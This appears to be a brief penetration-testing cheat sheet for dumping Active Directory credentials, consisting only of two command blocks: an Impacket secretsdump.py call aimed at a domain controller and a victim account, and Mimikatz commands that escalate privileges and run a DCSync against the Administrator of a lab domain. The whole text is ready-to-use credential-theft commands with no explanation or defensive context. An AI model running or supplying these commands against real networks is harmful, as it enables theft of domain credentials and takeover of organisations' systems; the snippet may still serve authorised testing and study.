Secretdumps
```bash
python3 ./examples/secretsdump.py '{DOMAIN}/{USER}@{IP|HOSTNAME}' -dc-ip {IP} -just-dc-user {VICTIM}  
```

Mimikatz
```powershell
privilege::debug
token::elevate
lsadump::dcsync /domain:hacklab.local /user:hacklab\Administrator
```

